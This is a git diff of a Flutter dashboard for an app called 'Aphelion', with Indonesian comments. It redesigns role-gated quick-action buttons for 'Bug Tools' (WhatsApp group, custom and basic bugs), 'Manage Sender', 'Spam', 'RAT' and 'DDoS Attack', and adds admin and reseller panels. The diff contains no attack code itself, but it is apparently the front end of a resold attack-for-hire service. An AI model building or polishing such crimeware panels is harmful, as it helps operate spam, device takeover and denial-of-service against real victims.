@@ -726,45 +726,8 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
   Widget _buildQuickActionButtons() {
     final String currentRole = role.toLowerCase();
     final bool canAccessRat = ['dev', 'high admin', 'admin', 'high owner', 'owner'].contains(currentRole);
-
-    final List<Map<String, dynamic>> actions = [
-      {
-        'icon': FontAwesomeIcons.whatsapp,
-        'label': 'Bug Tools',
-        'page': 'bug',
-        'color': const Color(0xFF25D366),
-        'bgColor': const Color(0xFF102016),
-      },
-      {
-        'icon': FontAwesomeIcons.paperPlane,
-        'label': 'Manage Sender',
-        'page': 'sender',
-        'color': Colors.blueAccent,
-        'bgColor': const Color(0xFF0A1628),
-      },
-      {
-        'icon': FontAwesomeIcons.solidEnvelope,
-        'label': 'Spam',
-        'page': 'telegram',
-        'color': Colors.purpleAccent,
-        'bgColor': const Color(0xFF180A28),
-      },
-      if (canAccessRat)
-        {
-          'icon': Icons.phone_android,
-          'label': 'RAT',
-          'page': 'rat',
-          'color': Colors.orangeAccent,
-          'bgColor': const Color(0xFF281A0A),
-        },
-      {
-        'icon': Icons.security,
-        'label': 'DDoS Attack',
-        'page': 'ddos',
-        'color': Colors.redAccent,
-        'bgColor': const Color(0xFF280A0A),
-      },
-    ];
+    final bool canAccessAllBugs = ['dev', 'high admin', 'admin', 'high owner', 'owner'].contains(currentRole);
+    final bool canAccessResellerBugs = ['reseller'].contains(currentRole);
 
     return Padding(
       padding: const EdgeInsets.symmetric(horizontal: 16),
@@ -785,60 +748,224 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
           SingleChildScrollView(
             scrollDirection: Axis.horizontal,
             child: Row(
-              children: actions.map((action) {
-                final Color iconColor = action['color'] as Color;
-                final Color bgColor = action['bgColor'] as Color;
-                return Padding(
+              children: [
+                // ── BUG TOOLS dengan popup ──
+                Padding(
                   padding: const EdgeInsets.only(right: 16),
                   child: GestureDetector(
-                    onTap: () => _selectFromDrawer(action['page'] as String),
+                    onTap: () => _showBugToolsPopup(canAccessAllBugs, canAccessResellerBugs),
                     child: Column(
                       children: [
-                        // Tombol bulat
                         Container(
                           width: 60,
                           height: 60,
                           decoration: BoxDecoration(
                             shape: BoxShape.circle,
-                            color: bgColor,
-                            border: Border.all(
-                              color: iconColor.withOpacity(0.5),
-                              width: 1.5,
-                            ),
-                            boxShadow: [
-                              BoxShadow(
-                                color: iconColor.withOpacity(0.25),
-                                blurRadius: 10,
-                                spreadRadius: 1,
-                              ),
-                            ],
+                            color: const Color(0xFF102016),
+                            border: Border.all(color: const Color(0xFF25D366).withOpacity(0.5), width: 1.5),
                           ),
-                          child: Center(
-                            child: (action['page'] == 'rat' || action['page'] == 'ddos')
-                                ? Icon(action['icon'] as IconData, color: iconColor, size: 26)
-                                : FaIcon(action['icon'] as IconData, color: iconColor, size: 22),
-                          ),
+                          child: const Center(child: FaIcon(FontAwesomeIcons.whatsapp, color: Color(0xFF25D366), size: 24)),
                         ),
                         const SizedBox(height: 8),
-                        // Label di bawah tombol
-                        Text(
-                          action['label'] as String,
-                          style: const TextStyle(
-                            color: Colors.white70,
-                            fontSize: 10,
-                            fontFamily: "ShareTechMono",
-                            letterSpacing: 0.5,
+                        const Text("Bug Tools", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                      ],
+                    ),
+                  ),
+                ),
+
+                // ── MANAGE SENDER (WhatsApp icon) ──
+                Padding(
+                  padding: const EdgeInsets.only(right: 16),
+                  child: GestureDetector(
+                    onTap: () => _selectFromDrawer('sender'),
+                    child: Column(
+                      children: [
+                        Container(
+                          width: 60,
+                          height: 60,
+                          decoration: BoxDecoration(
+                            shape: BoxShape.circle,
+                            color: const Color(0xFF0A1628),
+                            border: Border.all(color: Colors.blueAccent.withOpacity(0.5), width: 1.5),
                           ),
-                          textAlign: TextAlign.center,
+                          child: const Center(child: FaIcon(FontAwesomeIcons.whatsapp, color: Colors.blueAccent, size: 24)),
+                        ),
+                        const SizedBox(height: 8),
+                        const Text("Manage Sender", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                      ],
+                    ),
+                  ),
+                ),
+
+                // ── SPAM ──
+                Padding(
+                  padding: const EdgeInsets.only(right: 16),
+                  child: GestureDetector(
+                    onTap: () => _selectFromDrawer('telegram'),
+                    child: Column(
+                      children: [
+                        Container(
+                          width: 60,
+                          height: 60,
+                          decoration: BoxDecoration(
+                            shape: BoxShape.circle,
+                            color: const Color(0xFF180A28),
+                            border: Border.all(color: Colors.purpleAccent.withOpacity(0.5), width: 1.5),
+                          ),
+                          child: const Center(child: FaIcon(FontAwesomeIcons.solidEnvelope, color: Colors.purpleAccent, size: 22)),
+                        ),
+                        const SizedBox(height: 8),
+                        const Text("Spam", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                      ],
+                    ),
+                  ),
+                ),
+
+                // ── RAT (role tertentu) ──
+                if (canAccessRat)
+                  Padding(
+                    padding: const EdgeInsets.only(right: 16),
+                    child: GestureDetector(
+                      onTap: () => _selectFromDrawer('rat'),
+                      child: Column(
+                        children: [
+                          Container(
+                            width: 60,
+                            height: 60,
+                            decoration: BoxDecoration(
+                              shape: BoxShape.circle,
+                              color: const Color(0xFF281A0A),
+                              border: Border.all(color: Colors.orangeAccent.withOpacity(0.5), width: 1.5),
+                            ),
+                            child: const Center(child: Icon(Icons.phone_android, color: Colors.orangeAccent, size: 26)),
+                          ),
+                          const SizedBox(height: 8),
+                          const Text("RAT", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                        ],
+                      ),
+                    ),
+                  ),
+
+                // ── DDoS Attack ──
+                Padding(
+                  padding: const EdgeInsets.only(right: 16),
+                  child: GestureDetector(
+                    onTap: () => _selectFromDrawer('ddos'),
+                    child: Column(
+                      children: [
+                        Container(
+                          width: 60,
+                          height: 60,
+                          decoration: BoxDecoration(
+                            shape: BoxShape.circle,
+                            color: const Color(0xFF280A0A),
+                            border: Border.all(color: Colors.redAccent.withOpacity(0.5), width: 1.5),
+                          ),
+                          child: const Center(child: Icon(Icons.security, color: Colors.redAccent, size: 26)),
+                        ),
+                        const SizedBox(height: 8),
+                        const Text("DDoS Attack", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                      ],
+                    ),
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  // ── BUG TOOLS POPUP (pilih tipe bug) ──
+  void _showBugToolsPopup(bool canAccessAllBugs, bool canAccessResellerBugs) {
+    final RenderBox? renderBox = context.findRenderObject() as RenderBox?;
+    if (renderBox == null) return;
+
+    showDialog(
+      context: context,
+      barrierColor: Colors.black.withOpacity(0.5),
+      barrierDismissible: true,
+      builder: (ctx) => Dialog(
+        backgroundColor: Colors.transparent,
+        insetPadding: const EdgeInsets.symmetric(horizontal: 60),
+        child: ClipRRect(
+          borderRadius: BorderRadius.circular(16),
+          child: BackdropFilter(
+            filter: ImageFilter.blur(sigmaX: 14, sigmaY: 14),
+            child: Container(
+              decoration: BoxDecoration(
+                color: Colors.black.withOpacity(0.7),
+                borderRadius: BorderRadius.circular(16),
+                border: Border.all(color: const Color(0xFF25D366).withOpacity(0.3), width: 1),
+              ),
+              child: Column(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  // Header
+                  Container(
+                    padding: const EdgeInsets.all(16),
+                    decoration: BoxDecoration(
+                      border: Border(bottom: BorderSide(color: const Color(0xFF25D366).withOpacity(0.2), width: 1)),
+                    ),
+                    child: Row(
+                      children: [
+                        const FaIcon(FontAwesomeIcons.whatsapp, color: Color(0xFF25D366), size: 18),
+                        const SizedBox(width: 10),
+                        const Text("Bug Tools", style: TextStyle(color: Colors.white, fontSize: 15, fontFamily: "ShareTechMono", fontWeight: FontWeight.bold, letterSpacing: 1.0)),
+                        const Spacer(),
+                        GestureDetector(
+                          onTap: () => Navigator.pop(ctx),
+                          child: const Icon(Icons.close, color: Colors.white54, size: 18),
                         ),
                       ],
                     ),
                   ),
-                );
-              }).toList(),
+                  // Options
+                  if (canAccessAllBugs || canAccessResellerBugs)
+                    _bugPopupItem(ctx, Icons.group, "Group Bug", 'group_bug', Colors.tealAccent),
+                  if (canAccessAllBugs)
+                    _bugPopupItem(ctx, Icons.terminal, "Custom Bug", 'custom_bug', Colors.amberAccent),
+                  _bugPopupItem(ctx, Icons.bolt, "Basic Bug", 'bug', const Color(0xFF25D366)),
+                  const SizedBox(height: 6),
+                ],
+              ),
             ),
           ),
-        ],
+        ),
+      ),
+    );
+  }
+
+  Widget _bugPopupItem(BuildContext ctx, IconData icon, String title, String page, Color color) {
+    return Material(
+      color: Colors.transparent,
+      child: InkWell(
+        onTap: () {
+          Navigator.pop(ctx);
+          _selectFromDrawer(page);
+        },
+        child: Padding(
+          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
+          child: Row(
+            children: [
+              Container(
+                width: 36,
+                height: 36,
+                decoration: BoxDecoration(
+                  shape: BoxShape.circle,
+                  color: color.withOpacity(0.12),
+                  border: Border.all(color: color.withOpacity(0.4), width: 1),
+                ),
+                child: Center(child: Icon(icon, color: color, size: 18)),
+              ),
+              const SizedBox(width: 14),
+              Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontFamily: "ShareTechMono", letterSpacing: 0.8)),
+              const Spacer(),
+              Icon(Icons.chevron_right, color: Colors.white24, size: 18),
+            ],
+          ),
+        ),
       ),
     );
   }
@@ -1689,105 +1816,205 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
     );
   }
 
-  // === SIDEBAR DRAWER ===
+  // === TOP APP BAR ===
+  PreferredSizeWidget _buildTopAppBar() {
+    return PreferredSize(
+      preferredSize: const Size.fromHeight(56),
+      child: ClipRect(
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 12, sigmaY: 12),
+          child: Container(
+            decoration: BoxDecoration(
+              color: Colors.black.withOpacity(0.45),
+              border: Border(
+                bottom: BorderSide(
+                  color: const Color(0xFF25D366).withOpacity(0.2),
+                  width: 1,
+                ),
+              ),
+            ),
+            child: SafeArea(
+              bottom: false,
+              child: SizedBox(
+                height: 56,
+                child: Row(
+                  children: [
+                    Material(
+                      color: Colors.transparent,
+                      child: InkWell(
+                        borderRadius: BorderRadius.circular(12),
+                        onTap: () => _scaffoldKey.currentState?.openDrawer(),
+                        child: const Padding(
+                          padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+                          child: Icon(Icons.menu_rounded, color: Color(0xFFE0E0E0), size: 24),
+                        ),
+                      ),
+                    ),
+                    Expanded(
+                      child: Center(
+                        child: Image.asset(
+                          'assets/images/title.png',
+                          height: 28,
+                          fit: BoxFit.contain,
+                          errorBuilder: (_, __, ___) => const Text(
+                            "APHELION",
+                            style: TextStyle(
+                              color: Color(0xFFE0E0E0),
+                              fontFamily: "Orbitron",
+                              fontSize: 16,
+                              fontWeight: FontWeight.bold,
+                              letterSpacing: 3,
+                            ),
+                          ),
+                        ),
+                      ),
+                    ),
+                    const SizedBox(width: 56),
+                  ],
+                ),
+              ),
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+
+  // === SIDEBAR DRAWER (Glass Effect + Credit) ===
   Widget _buildSidebarDrawer() {
     final String currentRole = role.toLowerCase();
     final bool canAccessAdmin = ['dev', 'high admin', 'admin', 'high owner', 'owner'].contains(currentRole);
     final bool canAccessSeller = ['dev', 'high admin', 'admin', 'high owner', 'owner', 'reseller'].contains(currentRole);
 
     return Drawer(
-      backgroundColor: const Color(0xFF0A0D0B),
-      child: SafeArea(
-        child: Column(
-          children: [
-            // Header sidebar
-            Container(
-              width: double.infinity,
-              padding: const EdgeInsets.symmetric(vertical: 28, horizontal: 20),
-              decoration: BoxDecoration(
-                gradient: LinearGradient(
-                  colors: [const Color(0xFF102016), const Color(0xFF0A0D0B)],
-                  begin: Alignment.topCenter,
-                  end: Alignment.bottomCenter,
-                ),
-                border: Border(
-                  bottom: BorderSide(color: const Color(0xFF25D366).withOpacity(0.3), width: 1),
-                ),
+      backgroundColor: Colors.transparent,
+      child: ClipRect(
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 18, sigmaY: 18),
+          child: Container(
+            decoration: BoxDecoration(
+              color: Colors.black.withOpacity(0.55),
+              border: Border(
+                right: BorderSide(color: const Color(0xFF25D366).withOpacity(0.18), width: 1),
               ),
+            ),
+            child: SafeArea(
               child: Column(
                 crossAxisAlignment: CrossAxisAlignment.start,
                 children: [
+                  // ── HEADER GLASS ──
                   Container(
-                    width: 52,
-                    height: 52,
+                    width: double.infinity,
+                    padding: const EdgeInsets.fromLTRB(20, 24, 20, 20),
                     decoration: BoxDecoration(
-                      borderRadius: BorderRadius.circular(14),
-                      border: Border.all(color: const Color(0xFF25D366).withOpacity(0.5), width: 1.5),
-                      image: const DecorationImage(
-                        image: NetworkImage("https://e.top4top.io/p_36970lnj11.jpg"),
-                        fit: BoxFit.cover,
+                      color: Colors.white.withOpacity(0.04),
+                      border: Border(
+                        bottom: BorderSide(color: const Color(0xFF25D366).withOpacity(0.25), width: 1),
                       ),
                     ),
-                  ),
-                  const SizedBox(height: 12),
-                  Text(
-                    username,
-                    style: const TextStyle(
-                      color: Colors.white,
-                      fontSize: 18,
-                      fontWeight: FontWeight.bold,
-                      fontFamily: "ShareTechMono",
+                    child: Row(
+                      children: [
+                        Container(
+                          width: 54,
+                          height: 54,
+                          decoration: BoxDecoration(
+                            borderRadius: BorderRadius.circular(15),
+                            border: Border.all(color: const Color(0xFF25D366).withOpacity(0.5), width: 1.5),
+                            image: const DecorationImage(
+                              image: NetworkImage("https://e.top4top.io/p_36970lnj11.jpg"),
+                              fit: BoxFit.cover,
+                            ),
+                          ),
+                        ),
+                        const SizedBox(width: 14),
+                        Expanded(
+                          child: Column(
+                            crossAxisAlignment: CrossAxisAlignment.start,
+                            children: [
+                              Text(
+                                username,
+                                style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold, fontFamily: "ShareTechMono"),
+                                overflow: TextOverflow.ellipsis,
+                              ),
+                              const SizedBox(height: 5),
+                              Container(
+                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
+                                decoration: BoxDecoration(
+                                  color: const Color(0xFF25D366).withOpacity(0.15),
+                                  borderRadius: BorderRadius.circular(6),
+                                  border: Border.all(color: const Color(0xFF25D366).withOpacity(0.4), width: 1),
+                                ),
+                                child: Text(
+                                  role.toUpperCase(),
+                                  style: const TextStyle(color: Color(0xFF25D366), fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 1.5, fontWeight: FontWeight.bold),
+                                ),
+                              ),
+                            ],
+                          ),
+                        ),
+                      ],
                     ),
                   ),
-                  const SizedBox(height: 4),
-                  Text(
-                    role.toUpperCase(),
-                    style: const TextStyle(
-                      color: Color(0xFF25D366),
-                      fontSize: 11,
-                      fontFamily: "ShareTechMono",
-                      letterSpacing: 1.5,
+
+                  const SizedBox(height: 16),
+
+                  Padding(
+                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 4),
+                    child: Text(
+                      "PANEL",
+                      style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 2.5),
+                    ),
+                  ),
+
+                  if (canAccessAdmin)
+                    _buildDrawerItem(icon: Icons.admin_panel_settings, title: "Admin Panel", page: 'admin', color: Colors.redAccent),
+
+                  if (canAccessSeller)
+                    _buildDrawerItem(icon: Icons.store, title: "Seller Panel", page: 'reseller', color: Colors.blueAccent),
+
+                  const Spacer(),
+
+                  Divider(color: Colors.white.withOpacity(0.08), height: 1, indent: 20, endIndent: 20),
+                  const SizedBox(height: 16),
+
+                  // ── DEVELOPER CREDIT ──
+                  Padding(
+                    padding: const EdgeInsets.fromLTRB(20, 0, 20, 20),
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        Row(
+                          children: [
+                            Container(
+                              width: 34,
+                              height: 34,
+                              decoration: BoxDecoration(
+                                shape: BoxShape.circle,
+                                color: const Color(0xFF25D366).withOpacity(0.12),
+                                border: Border.all(color: const Color(0xFF25D366).withOpacity(0.3), width: 1),
+                              ),
+                              child: const Center(child: Icon(Icons.code, color: Color(0xFF25D366), size: 16)),
+                            ),
+                            const SizedBox(width: 10),
+                            Column(
+                              crossAxisAlignment: CrossAxisAlignment.start,
+                              children: [
+                                const Text("Developed by RiiTech", style: TextStyle(color: Colors.white70, fontSize: 11, fontFamily: "ShareTechMono", letterSpacing: 0.5)),
+                                const SizedBox(height: 2),
+                                Text("Aphelion Project", style: TextStyle(color: const Color(0xFF25D366).withOpacity(0.8), fontSize: 10, fontFamily: "ShareTechMono", letterSpacing: 1.0)),
+                              ],
+                            ),
+                          ],
+                        ),
+                        const SizedBox(height: 10),
+                        Text("© 2024 All Rights Reserved", style: TextStyle(color: Colors.white.withOpacity(0.18), fontSize: 9, fontFamily: "ShareTechMono", letterSpacing: 1.0)),
+                      ],
                     ),
                   ),
                 ],
               ),
             ),
-
-            const SizedBox(height: 12),
-
-            // Menu items
-            if (canAccessAdmin)
-              _buildDrawerItem(
-                icon: Icons.admin_panel_settings,
-                title: "Admin Panel",
-                page: 'admin',
-                color: Colors.redAccent,
-              ),
-
-            if (canAccessSeller)
-              _buildDrawerItem(
-                icon: Icons.store,
-                title: "Seller Panel",
-                page: 'reseller',
-                color: Colors.blueAccent,
-              ),
-
-            const Spacer(),
-
-            // Footer
-            Padding(
-              padding: const EdgeInsets.all(16),
-              child: Text(
-                "Aphelion Glitch",
-                style: TextStyle(
-                  color: Colors.white.withOpacity(0.2),
-                  fontFamily: "ShareTechMono",
-                  fontSize: 11,
-                  letterSpacing: 1.5,
-                ),
-              ),
-            ),
-          ],
+          ),
         ),
       ),
     );
@@ -1862,38 +2089,11 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
       child: SafeArea(
         top: false,
         child: SizedBox(
-          height: 64,
+          height: 72,
           child: Row(
             children: [
               _buildNavItem(0, Icons.home_rounded, "Home"),
               _buildNavItem(1, Icons.build_rounded, "Tools"),
-              // Tombol buka sidebar di tengah
-              Expanded(
-                child: GestureDetector(
-                  onTap: () => _scaffoldKey.currentState?.openDrawer(),
-                  child: Container(
-                    margin: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
-                    decoration: BoxDecoration(
-                      gradient: LinearGradient(
-                        colors: [const Color(0xFF25D366), const Color(0xFF128C7E)],
-                        begin: Alignment.topLeft,
-                        end: Alignment.bottomRight,
-                      ),
-                      borderRadius: BorderRadius.circular(12),
-                      boxShadow: [
-                        BoxShadow(
-                          color: const Color(0xFF25D366).withOpacity(0.3),
-                          blurRadius: 8,
-                          spreadRadius: 1,
-                        ),
-                      ],
-                    ),
-                    child: const Center(
-                      child: Icon(Icons.dashboard_rounded, color: Colors.white, size: 22),
-                    ),
-                  ),
-                ),
-              ),
               _buildNavItem(2, Icons.person_rounded, "Account"),
             ],
           ),
@@ -1944,16 +2144,14 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
 
   @override
   Widget build(BuildContext context) {
-    // Menangkap ukuran layar untuk batasan Assistive Touch & Animasi Menu
-    final screenSize = MediaQuery.of(context).size;
-    final bool isRightSide = _assistiveTouchPosition.dx > (screenSize.width / 2);
-    final bool isBottomSide = _assistiveTouchPosition.dy > (screenSize.height / 2);
-
     return Scaffold(
       key: _scaffoldKey,
       extendBodyBehindAppBar: true,
       backgroundColor: Colors.black,
       
+      // === TOP APP BAR ===
+      appBar: _buildTopAppBar(),
+
       // === SIDEBAR DRAWER ===
       drawer: _buildSidebarDrawer(),
 
@@ -1981,123 +2179,13 @@ class _DashboardPageState extends State<DashboardPage> with SingleTickerProvider
 
           // 2. Main Content
           SafeArea(
-            top: false, // Menonaktifkan batas atas agar benar-benar full screen (menembus notch/poni layar)
-            bottom: false, // Menonaktifkan batas bawah
+            top: false,
+            bottom: false,
             child: Padding(
-              padding: const EdgeInsets.only(top: 0), // Jarak atas dinolkan agar tidak ada sisa celah
+              padding: const EdgeInsets.only(top: 0),
               child: FadeTransition(
                 opacity: _animation,
                 child: _selectedPage,
-              ),
-            ),
-          ),
-
-          // 3. The Header (Profile Only) - DIHAPUS / DISEMBUNYIKAN
-          // Fungsi digantikan ke dalam Assistive Menu 
-          /* Positioned(
-               top: 0,
-               left: 0,
-               right: 0,
-               child: SafeArea(
-                 child: _buildDynamicAppBar(),
-               ),
-             ), */
-
-          // 4. Layer Transparan untuk menutup menu jika di-tap di luar area
-          if (_isAssistiveMenuOpen)
-            Positioned.fill(
-              child: GestureDetector(
-                onTap: () {
-                  setState(() {
-                    _isAssistiveMenuOpen = false;
-                    _isBugToolsExpanded = false; // Tutup menu expand saat menu utama ditutup
-                  });
-                },
-                child: Container(
-                  color: Colors.transparent, // Tak terlihat tapi menangkap ketukan
-                ),
-              ),
-            ),
-
-          // 5. Animasi Menu Pop-Up
-          AnimatedPositioned(
-            duration: const Duration(milliseconds: 150),
-            // Penentuan posisi menu (di kiri/kanan bubble, atas/bawah)
-            left: isRightSide ? _assistiveTouchPosition.dx - 250 : _assistiveTouchPosition.dx + 70,
-            top: isBottomSide ? _assistiveTouchPosition.dy - 350 : _assistiveTouchPosition.dy,
-            child: AnimatedScale(
-              scale: _isAssistiveMenuOpen ? 1.0 : 0.0,
-              duration: const Duration(milliseconds: 250),
-              curve: Curves.easeOutBack, // Memberikan efek memantul ringan
-              alignment: isRightSide 
-                  ? (isBottomSide ? Alignment.bottomRight : Alignment.topRight)
-                  : (isBottomSide ? Alignment.bottomLeft : Alignment.topLeft),
-              child: _buildAssistiveMenu(),
-            ),
-          ),
-
-          // 6. Assistive Touch Bubble
-          Positioned(
-            left: _assistiveTouchPosition.dx,
-            top: _assistiveTouchPosition.dy,
-            child: GestureDetector(
-              onPanUpdate: (details) {
-                setState(() {
-                  // Jika menu terbuka lalu di-drag, otomatis tertutup
-                  if (_isAssistiveMenuOpen) {
-                     _isAssistiveMenuOpen = false;
-                     _isBugToolsExpanded = false;
-                  }
-
-                  double newX = _assistiveTouchPosition.dx + details.delta.dx;
-                  double newY = _assistiveTouchPosition.dy + details.delta.dy;
-                  
-                  // Mencegah bubble keluar dari batas layar
-                  newX = newX.clamp(0.0, screenSize.width - 60.0);
-                  newY = newY.clamp(0.0, screenSize.height - 120.0);
-                  
-                  _assistiveTouchPosition = Offset(newX, newY);
-                });
-              },
-              onTap: () {
-                setState(() {
-                  _isAssistiveMenuOpen = !_isAssistiveMenuOpen;
-                  if(!_isAssistiveMenuOpen) _isBugToolsExpanded = false;
-                });
-              },
-              child: AnimatedContainer(
-                duration: const Duration(milliseconds: 200),
-                width: 60,
-                height: 60,
-                decoration: BoxDecoration(
-                  // Ubah warna bubble menjadi lebih hijau saat ditekan/menu terbuka
-                  color: _isAssistiveMenuOpen ? const Color(0xFF102016) : Colors.black.withOpacity(0.6),
-                  shape: BoxShape.circle,
-                  border: Border.all(
-                    color: _isAssistiveMenuOpen ? const Color(0xFF25D366) : const Color(0xFFE0E0E0).withOpacity(0.4),
-                    width: 1.5,
-                  ),
-                  boxShadow: [
-                    BoxShadow(
-                      color: _isAssistiveMenuOpen ? const Color(0xFF25D366).withOpacity(0.5) : Colors.black.withOpacity(0.5),
-                      blurRadius: 12,
-                      spreadRadius: 2,
-                    ),
-                  ],
-                ),
-                child: ClipOval(
-                  child: BackdropFilter(
-                    filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
-                    child: Padding(
-                      padding: const EdgeInsets.all(12.0),
-                      // Menggunakan icon dari assets
-                      child: Image.asset(
-                        'assets/images/logo.png', 
-                        fit: BoxFit.contain,
-                      ),
-                    ),
-                  ),
-                ),
               ),
             ),
           ),
